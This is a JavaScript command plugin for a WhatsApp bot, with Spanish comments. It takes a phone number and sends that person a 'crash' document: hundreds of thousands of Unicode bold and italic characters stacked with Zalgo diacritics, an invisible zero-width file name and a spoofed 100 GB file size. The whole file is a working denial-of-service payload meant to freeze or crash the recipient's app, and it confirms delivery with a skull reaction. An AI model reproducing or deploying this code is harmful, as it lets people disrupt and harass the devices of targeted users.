/* * 👑 Ultra Heavy Stealth Bug - Misa-Bot
 * Carga con Negritas/Cursivas Unicode + Bug 100GB
 * Uso: unicode 54911xxxx
 * Autor: Yanniel & Gemini
 */

const ultraHeavyBug = {
    name: 'unicode',
    alias: ['heavy', 'send', 'crash'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args }) => {
        if (!args[0]) return

        try {
            const chat = m.key.remoteJid
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            let cantidad = 400000
            let carga = ""
            
            for (let i = 0; i < cantidad; i++) {
                // Alternamos entre Negritas Matemáticas (0x1D400) y Cursivas (0x1D434)
                // Estos caracteres "pesan" mucho más que el texto normal
                if (i % 2 === 0) {
                    carga += String.fromCodePoint(0x1D400 + (i % 26)) // A-Z Negrita
                } else {
                    carga += String.fromCodePoint(0x1D434 + (i % 26)) // A-Z Cursiva
                }

                // Inyectamos "Zalgo" (Diacríticos apilados) para forzar el renderizado vertical
                carga += String.fromCodePoint(0x0300 + (i % 100)) 
                carga += String.fromCodePoint(0x0345) 
            }

            // UTF-16LE para maximizar el tamaño en bytes del archivo
            const buffer = Buffer.from(carga, 'utf-16le')
            const nombreInvisible = String.fromCodePoint(0x200C, 0x200C, 0x200C) + ".txt"

            // Envío directo al objetivo con el Bug de 100GB
            await conn.sendMessage(targetJid, {
                document: buffer,
                mimetype: 'text/plain',
                fileName: nombreInvisible,
                fileLength: 107374182400, // 100 GB visuales
                caption: null
            })

            // Reacción para confirmar que el bot disparó la carga
            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } })

        } catch (err) {
            console.error('Error en Ultra Heavy:', err)
        }
    }
}

export default ultraHeavyBug
